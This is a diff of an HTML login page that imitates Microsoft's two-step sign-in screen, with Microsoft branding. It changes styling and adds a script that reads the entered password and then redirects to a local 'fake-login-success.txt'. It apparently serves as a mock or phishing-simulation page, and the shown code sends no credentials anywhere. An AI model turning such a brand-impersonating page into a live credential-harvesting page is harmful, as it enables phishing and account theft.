@@ -20,7 +20,6 @@
       max-width: 400px;
       padding: 40px;
       box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      border-radius: 8px;
     }
     .logo {
       margin-bottom: 30px;
@@ -52,7 +51,6 @@
       border: none;
       width: 100%;
       cursor: pointer;
-      border-radius: 4px;
     }
     .btn:hover {
       background-color: #005ba1;
@@ -71,17 +69,15 @@
       font-size: 0.8rem;
       color: #555;
     }
-
-    /* Responsive tweaks */
-    @media (max-width: 480px) {
+    /* Mobile responsiveness */
+    @media (max-width: 600px) {
       .login-container {
         padding: 20px;
       }
       h2 {
-        font-size: 1.1rem;
+        font-size: 1rem;
       }
-      input[type="text"], input[type="password"], .btn {
-        padding: 10px;
+      .btn {
         font-size: 0.9rem;
       }
     }
@@ -95,33 +91,40 @@
     <h2>Sign in</h2>
     <form id="emailForm">
       <input type="text" id="email" placeholder="Email, phone, or Skype" required />
-      <a href="#" class="link">No account? Create one!</a>
+      <a href="#" class="link" id="createAccountLink">No account? Create one!</a>
       <a href="#" class="link">Sign in with a security key</a>
       <br>
       <input type="submit" value="Next" class="btn" />
     </form>
-
-    <!-- Password Form (hidden initially) -->
-    <form id="passwordForm" style="display: none;">
-      <input type="password" id="password" placeholder="Password" required />
-      <a href="#" class="link">Forgot password?</a>
+    <form id="passwordForm" style="display:none;">
+      <input type="password" id="password" placeholder="Enter your password" required />
       <br>
-      <input type="submit" value="Sign in" class="btn" />
+      <input type="submit" value="Sign In" class="btn" />
     </form>
-
     <div class="footer">
       Microsoft &copy; 2025
     </div>
   </div>
 
   <script>
-    // Handling email to password transition
-    const emailForm = document.getElementById('emailForm');
-    const passwordForm = document.getElementById('passwordForm');
-    emailForm.addEventListener('submit', function(e) {
+    // Show password form when "Next" is clicked
+    document.getElementById('emailForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      emailForm.style.display = 'none';
-      passwordForm.style.display = 'block';
+      var email = document.getElementById('email').value;
+      if (email) {
+        document.getElementById('emailForm').style.display = 'none';
+        document.getElementById('passwordForm').style.display = 'block';
+      }
+    });
+
+    // Handle password submission
+    document.getElementById('passwordForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      var password = document.getElementById('password').value;
+      if (password) {
+        // Simulate a successful login by redirecting to a fake text file
+        window.location.href = 'fake-login-success.txt';
+      }
     });
   </script>
 </body>
